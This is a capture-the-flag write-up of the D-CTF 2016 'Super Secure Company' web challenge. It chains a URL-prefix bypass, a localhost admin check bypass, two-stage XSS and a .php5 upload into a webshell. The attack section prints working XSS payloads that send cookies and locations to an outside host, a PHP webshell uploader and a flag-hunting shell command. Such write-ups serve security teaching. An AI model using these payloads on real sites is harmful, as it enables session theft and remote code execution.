---
layout: post
title: "D-CTF Qualifiers 2016: Super Secure Company LLC (Web 300)"
author: f0rki, verr
categories: writeup
tags: [cat/web, attack/css, lang/php]
---

* **Category:** Web
* **Points:** 300
* **Description:**

>
> Super Secure Company (SSC) LLC is a multi-million dollar company founded in
> 1937 which delivers extremly good products for nice people in over 137
> countries. Last year SSC LLC became the largest provider of awesome goods in
> the world, with over 133.337.456 products sold world wide. Can you help me
> steal their most valuable asset?
> http://10.13.37.13/?source
>

## Write-up

First we accessed the webapp's `index.php`. Conveniently it was possible to retreive the php source code using the `?source` get parameter. After some recon we also found that there exists an `admin.php` file, which also prints its source using the `?source` get parameter. How convenient!

### "This is probably a XSS challenge"

On the main page (served by `indey.php`) is a *contact* page, which says:

> Found an URL that doesn\'t work? Please submit it using the form below and one of our representatives will review the submission as fast as possible.

We were pretty sure that the representative visiting the submitted url was a bot :) For testing we submitted a URL we controlled, but that didn't result in anything. The source of `admin.php` revealed the reason why (comments by us):

```php
switch($page) {
<?php
// [...]
    case 'logs':
        // this case is probably visisted by the bot
        $title = 'Logs';
        $rows = $db->query('SELECT * FROM urls WHERE view=0');
        while($row = $rows->fetch_array()) {
            // only the URLs which match some hardcoded host are shown (and visited)
            if(parse_url($row['url'], PHP_URL_HOST) != parse_url($config['url'], PHP_URL_HOST))
                continue;
            $content .= '<div class="r"><a href="'.htmlentities($row['url']).'">Report '.$row['id'].'</a><a href="http://localhost/admin.php?page=hide&id='.$row['id'].'">Hide</a></div>';
        }
    break;
    case 'hide':
        $id = intval(@$_REQUEST['id']);
        $db->query('UPDATE urls set view=1 where id='.$id);
//[...]
?>
```

Only URLs which match some hardcoded host are shown (and therefore visited). So the bot never got to see our submitted URLs. Let's see how we can bypass this check.

But first for something different ...

### Include from arbitrary URL

There is this rather strange handling of the `page=print` case in the `index.php`:


```php
<?php
[...]
    case 'print':
        $url   = base64_decode($_REQUEST['url']);
        $title = '';
        if(begins_with($url, $config['url'])) {
            $content = getContentFromUrl($url);
        }

        if(isset($_REQUEST['load_template']) && ($_REQUEST['load_template'] == '1' || $_REQUEST['load_template'] == true)) {
            $content = only_body($content);
        }
    break;
[...]
?>
```

This code will download and include anything that comes from a url provided via (base64 encoded) get parameter. Unfortunately there is a check that requires the provided URL to begin with a certain string. By playing around a little bit, we can deduce that the provided URL must begin with the webapp's host/ip, therefore `http://10.13.37.13`.

Interestingly here we can see that the URL doesn't end in a `/`, or someting like that, so we can bypass the check using either of two different methods:

```
http://10.13.37.13@example.com/
http://10.13.37.13.example.com/
```

Both start with the correct string, but point to totally different domains.
That way we can get the server to include arbitrary HTML content from a remote location. This starts to be interesting. :)

### First XSS tests

So we uploaded a quick test file to a webserver of our own:

```html
<script>
document.write("<img src=\"http://f0rki.at/xss/" + document.cookie + "\" />");
</script>
```

Using this simple script we checked whether the content was actually included:

```python
import requests
import sys
from base64 import b64encode

BASE_URL = "http://10.13.37.13/?page=print&url="

def get_it(url):
    s = requests.session()
    url = b64encode(url)
    res = s.get(BASE_URL + url)
    return res

if __name__ == "__main__":
    assert len(sys.argv) == 2, "need argv[1]"
    x = get_it(sys.argv[1])
    print x.request.url
    print
    print x.text
```

```
$ python relay.py "http://10.13.37.13.f0rki.at/xss.html"
http://10.13.37.13/?page=print&url=aHR0cDovLzEwLjEzLjM3LjEzLmYwcmtpLmF0L3hzcy5odG1s

<!DOCTYPE html>
<html lang="en">
  <head>
[...]

    <div class="container">

      <div class="starter-template">
        <h1></h1>
        <p class="lead"><html>
<script>
document.write("<img src=\"http://f0rki.at/" + document.cookie + "\" />");
</script>
</html>
</p>
      </div>

    </div><!-- /.container -->


    <!-- Bootstrap core JavaScript
    ================================================== -->
    <!-- Placed at the end of the document so the pages load faster -->
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/1.12.4/jquery.min.js"></script>
    <script src="http://10.13.37.13/public/bootstrap.min.js"></script>
  </body>
</html>
```

So we can see that the server included our xss payload. We submitted the URL triggering the xss (`http://10.13.37.13/?page=print&url=aHR0cDovLzEwLjEzLjM3LjEzLmYwcmtpLmF0L3hzcy5o`) for checking (via the *contact* page, see above).

This url also bypasses the proper host checking in `admin.php`, because of course this is a URL on the same site. After a couple of seconds we could see that some client (the bot) connects to our webserver, fetches the payload and then we can check the error logs for the cookie, etc. But in that case the cookie doesn't buy us much, since it's not used anywhere. We need a different XSS payload.

### The admin.php 127.0.0.1 check

Unfortunately the `admin.php` script had a rather lazy, but for a xss hacker also nasty check at the top:

```php
<?php
[...]
//lazy admin approach to "authenticate"
if($_SERVER['REMOTE_ADDR'] !== '127.0.0.1') {
    die('You are not allowed.');
[...]
?>
}
```

We can bypass this check using the trick from above, including a *localhost* page instead of our xss endpoint. The `index.php` (loading the file via its `print` view) is is able to reach the `admin.php` via a localhost connection and therefore passes the authentication check.

```
$ python relay.py 'http://10.13.37.13@127.0.0.1/admin.php'
http://10.13.37.13/?page=print&url=aHR0cDovLzEwLjEzLjM3LjEzQDEyNy4wLjAuMS9hZG1pbi5waHA=

<!DOCTYPE html>
<html lang="en">

[...]

<!DOCTYPE html>
<html lang="en">

[...]

    <div class="container">

      <div class="starter-template">
        <h1>Homepage - Admin Panel</h1>
        <p class="lead">Nothing.</p>       <!-- this is from the admin page -->
      </div>

    </div><!-- /.container -->


    <!-- Bootstrap core JavaScript
    ================================================== -->
    <!-- Placed at the end of the document so the pages load faster -->
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/1.12.4/jquery.min.js"></script>
    <script src="http://10.13.37.13/public/bootstrap.min.js"></script>
  </body>
</html>
</p>

[...]
</html>
```

Unfortunately this doesn't help us much, since there is no interesting
functionality in `admin.php` reachable with `GET` requests.


### Abusing XSS to upload a webshell

But the `admin.php` has another interesting feature. One can upload files to a known location using `?page=upload`. But we still have one problem, that we learned about the hard way.

The bot first visists `http://127.0.0.1/admin.php?page=logs` and then clicks on
all the submitted links that are not yet hidden and will hide them them. The links are all to the host `http://13.37.37.13/`, since in contrast to the url check in `index.php` there is  a proper URL parser used to check the host. Following that, we are not able to open a page on `127.0.0.1` and therefore any request we perform to `http://127.0.0.1/admin.php` (post request to upload a file) is a cross-origin request.

The same-origin policy at least prevents us from reading the response. We tried firing blind file upload `POSTs` but that didn't work out so well, probably because the `$_SERVER['REMOTE_ADDR']` is then set to something other that `127.0.0.1`.

It took us quite a while to find the pretty simple way to bypass this.

### The final attack: Two-stage XSS

We are gonna use two XSS stages.

1. **Make bot visit stage 1 on our server**  
   `http://10.13.37.13/index.php?page=print&url=(base64 http://10.13.37.13.f0rki.at/stage1.html)`  
   this passes the check in `admin.php` because the host is 10.13.37.13.

2. **Stage 1 html redirects to `127.0.0.1` origin, which loads stage 2 XSS
   payload**, we used javascript to set `window.location` to  
   `http://127.0.0.1/index.php?page=print&url=(base64 http://10.13.37.13.f0rki.at/stage2.html )`  
   this way we change the origin back to `127.0.0.1`, can execute JS in the context of the bot and are able to perfrom `POST` requests without violating the same-origin policy and bypassing the admin check.

3. **Stage 2 payload uploads a file using an ajax `POST` request** to
   `http://127.0.0.1/admin.php?page=upload`  

   But the file upload code disallowed certain file extensions:

   ```php
   <?php
   [...]
   if($extension == '' || $extension == 'php' || $extension == 'htaccess'
      || $extension == 'pl' || $extension == 'py' || $extension == 'c'
      || $extension == 'cpp' || $extension == 'ini' || $extension == 'html') { // fail
   [...]
   ?>
   ```
   
   Fortunately the `.php5` extension was not part of the blacklist, so we just used that and hoped for the best.

4. **Upload file with `.php5` extension to get execute commands.** For example:  
   `http://10.13.37.13/uploads/file_with_more_than_twelve_chars.php5`  
5. **Get flag using the webshell**. We executed `find / -name *flag* | xargs cat`, which revealed the flag in `/flag`:

   `DCTF{5a42e723159e537443b99ba7f95fbe04}`

:)

### Attack code

Here is the `stage1.html` we used. Including some diagnostics exfiltrated via `img` tags.

```html
<script>
document.write("<img src=\"http://f0rki.at/stage1/" + document.cookie + "-" + window.location + "\" />");

window.location = "http://127.0.0.1/?page=print&url=aHR0cDovLzEwLjEzLjM3LjEzLmYwcmtpLmF0L3N0YWdlMi5odG1s";
</script>
```

Here is the `stage2.html` we used in the end. We had a couple of different versions of the payload until we got it right.

```html
<script src="https://ajax.googleapis.com/ajax/libs/jquery/1.12.4/jquery.min.js"></script>

<script>
document.write("<img src=\"http://f0rki.at/stage2/" + window.location + "\" />");

/*
<form method="post" enctype="multipart/form-data">
            Image: <input type="file" name="file" id="file">
            <input type="submit" value="Submit" name="submit" />
        </form>
*/

var content = "<?php echo system($_REQUEST['cmd']) ?>";
var blob = new Blob([content], { type: "text/plain" });
var data = new FormData();
data.append('submit', "Submit");
data.append('file', blob, "ozee2bai3weizohQuahCung4iQu4neeYXXX.php5");

jQuery.ajax({
    url: '/admin.php?page=upload',
    data: data,
    cache: false,
    contentType: false,
    processData: false,
    type: 'POST',
    success: function(data) {
        document.write("<img src=\"http://f0rki.at/stage2/success/" + escape(data) + "\" />");
    }
});

document.write("<img src=\"http://f0rki.at/stage2/done.png\" />");
</script>
```
